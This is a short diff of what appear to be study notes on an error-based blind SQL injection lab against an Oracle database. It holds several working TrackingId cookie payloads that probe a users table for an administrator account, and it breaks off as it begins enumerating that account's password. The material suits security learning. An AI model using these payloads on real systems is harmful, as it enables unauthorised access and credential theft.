@@ -260,5 +260,10 @@ GIVEN : The database contains a different table called users, with columns calle
       TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
       
       TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/1) ELSE '' END FROM dual)||'
-      
+
    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+
+   -ENUMERATE THE PASSWORD OF administrator
+
+    1.Find the length of password:
